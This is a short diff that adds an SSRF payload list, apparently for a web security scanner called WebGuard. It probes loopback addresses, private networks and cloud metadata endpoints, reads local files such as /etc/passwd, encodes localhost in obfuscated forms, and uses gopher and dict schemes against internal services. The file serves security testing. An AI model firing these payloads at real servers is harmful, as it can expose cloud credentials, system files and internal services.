@@ -1,0 +1,18 @@
+# WebGuard v3 — SSRF Payloads
+http://127.0.0.1/
+http://localhost/
+http://0.0.0.0/
+http://[::1]/
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/
+http://169.254.169.254/metadata/v1/
+http://192.168.1.1/
+http://10.0.0.1/
+file:///etc/passwd
+file:///c:/windows/win.ini
+http://127.1/
+http://0177.0.0.1/
+http://2130706433/
+dict://127.0.0.1:6379/info
+ftp://127.0.0.1/
+gopher://127.0.0.1:25/
